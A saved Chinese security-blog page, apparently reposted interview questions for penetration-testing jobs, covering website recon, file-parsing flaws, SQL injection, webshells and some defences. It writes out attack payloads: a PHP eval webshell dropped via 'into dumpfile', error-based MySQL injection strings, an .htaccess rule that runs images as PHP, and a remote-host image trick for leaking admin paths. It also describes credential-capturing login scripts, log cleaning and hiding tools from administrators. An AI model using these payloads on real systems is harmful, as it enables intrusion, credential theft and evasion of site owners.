@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>一套渗透测试岗面试题 - Se7en&#039;s Blog|资深apt install专家。</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Se7en&#039;s Blog|资深apt install专家。"><meta name="msapplication-TileImage" content="/img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Se7en&#039;s Blog|资深apt install专家。"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="转载：阿里安全应急响应中心微信公众号"><meta property="og:type" content="blog"><meta property="og:title" content="一套渗透测试岗面试题"><meta property="og:url" content="https://www.se7ensec.cn/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/"><meta property="og:site_name" content="Se7en&#039;s Blog|资深apt install专家。"><meta property="og:description" content="转载：阿里安全应急响应中心微信公众号"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.03/STCS.jpg"><meta property="article:published_time" content="2019-03-03T14:30:24.000Z"><meta property="article:modified_time" content="2020-02-08T14:38:02.356Z"><meta property="article:author" content="Se7en"><meta property="article:tag" content="面试经验"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.03/STCS.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.se7ensec.cn/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/"},"headline":"Se7en's Blog|资深apt install专家。","image":["https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.03/STCS.jpg"],"datePublished":"2019-03-03T14:30:24.000Z","dateModified":"2020-02-08T14:38:02.356Z","author":{"@type":"Person","name":"Se7en"},"description":"转载：阿里安全应急响应中心微信公众号"}</script><link rel="canonical" href="https://www.se7ensec.cn/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/"><link rel="icon" href="/img/favicon.ico"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Se7en's Blog|资深apt install专家。" type="application/atom+xml">
+</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="Se7en&#039;s Blog|资深apt install专家。" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2019-03-03T14:30:24.000Z" title="2019-03-03T14:30:24.000Z">2019-03-03</time>发表</span><span class="level-item"><time dateTime="2020-02-08T14:38:02.356Z" title="2020-02-08T14:38:02.356Z">2020-02-08</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/">生活随笔</a></span><span class="level-item">28 分钟读完 (大约4170个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">一套渗透测试岗面试题</h1><div class="content"><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.03/STCS.jpg"></p>
+<blockquote>
+<p>转载：阿里安全应急响应中心微信公众号</p>
+</blockquote>
+<a id="more"></a>
+
+<p><strong>1.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
+<p>​    1)信息收集<br>​        1，获取域名的whois信息,获取注册者邮箱姓名电话等。<br>​        2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>​        3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>​        4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>​        5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>​        6，google hack 进一步探测网站的信息，后台，敏感文件<br>​    2）漏洞扫描<br>​        开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>​        远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等<br>​    3）漏洞利用<br>​        利用以上的方式拿到webshell，或者其他权限<br>​    4）权限提升<br>​        提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权<br>​    5) 日志清理<br>​    6）总结报告及修复方案</p>
+<p><strong>2.判断出网站的CMS对渗透有什么意义？</strong></p>
+<p>​    查找网上已曝光的程序漏洞。</p>
+<p>​    如果开源，还能下载相对应的源码进行代码审计。</p>
+<p><strong>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</strong></p>
+<p>​    敏感文件、二级目录扫描</p>
+<p>​    站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
+<p><strong>4.常见的网站服务器容器。</strong></p>
+<p>​    IIS、Apache、nginx、Lighttpd、Tomcat</p>
+<p><strong>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p>
+<p>​    root权限以及网站的绝对路径。</p>
+<p><strong>6.目前已知哪些版本的容器有解析漏洞，具体举例。</strong></p>
+<p>​    <strong>IIS 6.0</strong><br>​    /xx.asp/xx.jpg “xx.asp”是文件夹名</p>
+<p>​    IIS 7.0/7.5<br>​    默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p>
+<p>​    Nginx<br>​    版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>​    空字节代码 xxx.jpg.php</p>
+<p>​    Apache<br>​    上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
+<p>​    lighttpd<br>​    xx.jpg/xx.php，<strong>不全,请小伙伴们在评论处不吝补充，谢谢！</strong></p>
+<p><strong>7.如何手工快速判断目标站是windows还是linux服务器？</strong></p>
+<p>​    linux大小写敏感,windows大小写不敏感。</p>
+<p><strong>8.为何一个mysql数据库的站，只有一个80端口开放？</strong></p>
+<p>​    更改了端口，没有扫描出来。</p>
+<p>​    站库分离。</p>
+<p>​    3306端口不对外开放</p>
+<p><strong>9.无法连接3389的几种情况</strong></p>
+<p>​    没开放3389 端口</p>
+<p>​    端口被修改</p>
+<p>​    防护拦截</p>
+<p>​    处于内网(需进行端口转发)</p>
+<p><strong>10.如何突破注入时字符被转义？</strong></p>
+<p>​    宽字符注入</p>
+<p>​    hex编码绕过</p>
+<p><strong>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
+<p>​    查看编辑器的名称版本,然后搜索公开的漏洞。</p>
+<p><strong>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</strong></p>
+<p>​    能做的事情很多，用隐藏网马来举例子：<br>​    插入<br>​    &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </FilesMatch><br>​    .jpg文件会被解析成.php文件。</p>
+<p>​    具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
+<p><strong>13.注入漏洞只能查账号密码？</strong></p>
+<p>​    只要权限广，拖库脱到老。</p>
+<p><strong>14.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
+<p>​    是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
+<p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，**</strong>如何实现到本地利用？**</p>
+<p>​    迅雷下载，直接改后缀为.mdb。</p>
+<p><strong>16.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
+<p>​    因为exp执行多半需要空格界定参数</p>
+<p><strong>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</strong></p>
+<p>​    同数据库。</p>
+<p><strong>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</strong></p>
+<p>​    and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
+<p><strong>19:某个防注入系统，在注入时会提示：</strong></p>
+<p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p>
+<p><strong>20、如何利用这个防注入系统拿shell？</strong></p>
+<p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：<a target="_blank" rel="noopener" href="http://ytxiao.lofter.com/post/40583a_ab36540%E3%80%82">http://ytxiao.lofter.com/post/40583a_ab36540。</a></p>
+<p><strong>21.上传大马后访问乱码时，有哪些解决办法？</strong></p>
+<p>​    浏览器中改编码。</p>
+<p><strong>22.审查上传点的元素有什么意义？</strong></p>
+<p>​    有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
+<p><strong>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</strong></p>
+<p>​    先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
+<p>​    其实有些站点，在登陆处也会这样提示</p>
+<p>​    所有和数据库有交互的地方都有可能有注入。</p>
+<p><strong>24.目标站发现某txt的下载地址为</strong><a target="_blank" rel="noopener" href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
+<p>​    这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
+<p><strong>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</strong></p>
+<p>​    直接在网站二级目录/abc/下扫描敏感文件及目录。</p>
+<p><strong>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</strong></p>
+<p>​    后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
+<p>​    在登录后才可以访问的文件中插入XSS脚本。</p>
+<p><strong>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</strong></p>
+<p>​    审查元素 把密码处的password属性改成text就明文显示了</p>
+<p><strong>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</strong></p>
+<p>​    原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
+<p><strong>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
+<p>​    在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</p>
+<p><strong>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</strong></p>
+<p>​    隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
+<p><strong>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</strong></p>
+<p>A. demo.jsp?id=2+1       B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
+<p><strong>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</strong></p>
+<p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
+<p><strong>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</strong></p>
+<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
+<p><strong>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</strong></p>
+<p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
+<p><strong>CSRF是跨站请求伪造攻击</strong>，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
+<p><strong>35、CSRF、SSRF和重放攻击有什么区别？</strong></p>
+<p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
+<p><strong>36、说出至少三种业务逻辑漏洞，以及修复方式？</strong></p>
+<p><strong>密码找回漏洞</strong>中存在</p>
+<p>1）密码允许暴力破解、</p>
+<p>2）存在通用型找回凭证、</p>
+<p>3）可以跳过验证步骤、</p>
+<p>4）找回凭证可以拦包获取</p>
+<p>等方式来通过厂商提供的密码找回功能来得到密码。<br><strong>身份认证漏洞</strong>中最常见的是</p>
+<p>1）会话固定攻击</p>
+<p>2） Cookie 仿冒</p>
+<p>只要得到 Session 或 Cookie 即可伪造用户身份。<br><strong>验证码漏洞</strong>中存在</p>
+<p>1）验证码允许暴力破解</p>
+<p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
+<p><strong>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
+<p>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:<strong><em>.com:82User-Agent:Mozilla/<br>5.0 Firefox/40Accept:text/css,/;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://****</em></strong>.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p>
+<p><strong>38、给你一个网站你是如何来渗透测试的?</strong><br>    在获取书面授权的前提下。</p>
+<p><strong>39、sqlmap，怎么对一个注入点注入？</strong><br>    1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>    2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>    3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p>
+<p><strong>40、nmap，扫描的几种方式</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56ea8b844eb7">https://www.jianshu.com/p/56ea8b844eb7</a></p>
+<p><strong>41、sql注入的几种类型？</strong><br>    1）报错注入<br>    2）bool型注入<br>    3）延时注入<br>    4）宽字节注入</p>
+<p><strong>42、报错注入的函数有哪些？ 10个</strong><br>    1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————-<br>    2）通过floor报错 向下取整<br>    3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)<br>    4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));<br>    5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));<br>    6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));<br>    7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));<br>    8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));<br>    9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));<br>    10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p>
+<p><strong>43、延时注入如何来判断？</strong><br>    if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p>
+<p><strong>44、盲注和延时注入的共同点？</strong><br>    都是一个字符一个字符的判断</p>
+<p><strong>45、如何拿一个网站的webshell？</strong><br>    上传，后台编辑模板，sql注入写文件，命令执行，代码执行，<br>    一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
+<p><strong>46、sql注入写文件都有哪些函数？</strong><br>    select ‘一句话’ into outfile ‘路径’<br>    select ‘一句话’ into dumpfile ‘路径’<br>    select ‘<?php eval($_POST[1]) ?>‘ into dumpfile  ‘d:\wwwroot\baidu.com\nvhack.php’;</p>
+<p><strong>47、如何防止CSRF?</strong><br>    1,验证referer<br>    2，验证token<br>    详细：<a target="_blank" rel="noopener" href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
+<p><strong>48、owasp 漏洞都有哪些？</strong><br>    1、SQL注入防护方法：<br>    2、失效的身份认证和会话管理<br>    3、跨站脚本攻击XSS<br>    4、直接引用不安全的对象<br>    5、安全配置错误<br>    6、敏感信息泄露<br>    7、缺少功能级的访问控制<br>    8、跨站请求伪造CSRF<br>    9、使用含有已知漏洞的组件<br>    10、未验证的重定向和转发</p>
+<p><strong>49、SQL注入防护方法？</strong><br>    1、使用安全的API<br>    2、对输入的特殊字符进行Escape转义处理<br>    3、使用白名单来规范化输入验证方法<br>    4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>    5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
+<p><strong>50、代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
+<p>1）代码执行：</p>
+<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
+<p>2）文件读取：</p>
+<p>file_get_contents(),highlight_file(),fopen(),read </p>
+<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3)命令执行：</p>
+<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<p><strong>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</strong><br>    src指定一个远程的脚本文件，获取referer</p>
+<p><strong>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</strong></p>
+<p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析<br>    AddType application/x-httpd-php .jpg<br>    &lt;img src=<a target="_blank" rel="noopener" href="http://xss.tv/1.jpg">http://xss.tv/1.jpg</a>&gt; 会以php方式来解析</p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>一套渗透测试岗面试题</p><p><a href="https://www.se7ensec.cn/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/">https://www.se7ensec.cn/2019/03/03/%E4%B8%80%E5%A5%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B2%97%E9%9D%A2%E8%AF%95%E9%A2%98/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Se7en</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2019-03-03</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-02-08</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/">面试经验</a></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">记一次曲折的报错注入</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/03/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%9F%90%E5%BD%B1%E8%A7%86%E7%AB%99/"><span class="level-item">记一次渗透提权某影视站</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="lv-container" data-id="city" data-uid="MTAyMC80MDkwNy8xNzQzMg=="><script>(function(d, s) {
+            var j, e = d.getElementsByTagName(s)[0];
+
+            if (typeof LivereTower === 'function') { return; }
+
+            j = d.createElement(s);
+            j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+            j.async = true;
+
+            e.parentNode.insertBefore(j, e);
+        })(document, 'script');</script><noscript>Please activate JavaScript for write a comment in LiveRe</noscript></div></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><figure class="media-left"><a class="image" href="/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"><img src="https://raw.githubusercontent.com/r00tSe7en/Mail-Probe/master/tz0.png" alt="鱼叉攻击|Mail-Probe 邮箱探针后台管理系统"></a></figure><div class="media-content"><p class="date"><time dateTime="2020-09-30T04:10:24.000Z">2020-09-30</time></p><p class="title"><a href="/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">鱼叉攻击|Mail-Probe 邮箱探针后台管理系统</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/flashpop.png" alt="水坑攻击|Flash钓鱼弹窗优化版"></a></figure><div class="media-content"><p class="date"><time dateTime="2020-09-14T04:10:24.000Z">2020-09-14</time></p><p class="title"><a href="/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/">水坑攻击|Flash钓鱼弹窗优化版</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.07.12/who-am-i.jpg" alt="内网渗透|基于winRM的横向移动"></a></figure><div class="media-content"><p class="date"><time dateTime="2020-08-26T14:10:24.000Z">2020-08-26</time></p><p class="title"><a href="/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">内网渗透|基于winRM的横向移动</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.08.24/1.png" alt="在线肾透测试中心"></a></figure><div class="media-content"><p class="date"><time dateTime="2020-08-24T14:10:24.000Z">2020-08-24</time></p><p class="title"><a href="/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/">在线肾透测试中心</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.08.22/1.jpg" alt="鱼叉攻击|使用Lnk文件的另类钓鱼方式"></a></figure><div class="media-content"><p class="date"><time dateTime="2020-08-22T07:10:24.000Z">2020-08-22</time></p><p class="title"><a href="/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/">鱼叉攻击|使用Lnk文件的另类钓鱼方式</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">44</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"><span class="level-start"><span class="level-item">生活随笔</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/00%E6%88%AA%E6%96%AD/"><span class="tag">00截断</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BurpSuite/"><span class="tag">BurpSuite</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BypassAV/"><span class="tag">BypassAV</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GetShell/"><span 